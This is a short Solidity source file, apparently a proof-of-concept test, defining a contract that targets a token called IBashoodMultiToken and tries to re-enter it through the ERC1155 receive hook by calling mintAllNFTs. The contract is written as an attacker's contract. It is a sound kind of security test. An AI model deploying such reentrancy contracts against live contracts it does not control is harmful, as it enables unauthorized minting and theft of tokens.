// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBashoodMultiToken {
    function nftCounter() external view returns (uint256);
    function owner() external view returns (address);
    function mint(address to, uint256 id, uint256 amount, bytes calldata data) external;
    function mintAllNFTs() external;
}

contract ERC1155ReentrantReceiver {
    IBashoodMultiToken public target;
    address public attacker;
    bool public reentered;

    constructor(address _target) {
        target = IBashoodMultiToken(_target);
        attacker = msg.sender;
    }

    // ERC1155 receiver hook
    function onERC1155Received(
        address,
        address,
        uint256,
        uint256,
        bytes calldata
    ) external returns (bytes4) {
        // Try to call mintAllNFTs or other state reading to detect reentrancy
        if (!reentered) {
            reentered = true;
            // attempt to read nftCounter (view) and reenter by calling mintAllNFTs of the target
            // this will fail if onlyOwner guards or access controls prevent it; it's a PoC
            try target.mintAllNFTs() {
                // if succeeds, we set reentered true
            } catch {
                // swallow
            }
        }
        return this.onERC1155Received.selector;
    }

    function supportsInterface(bytes4) external pure returns (bool) {
        return true;
    }
}
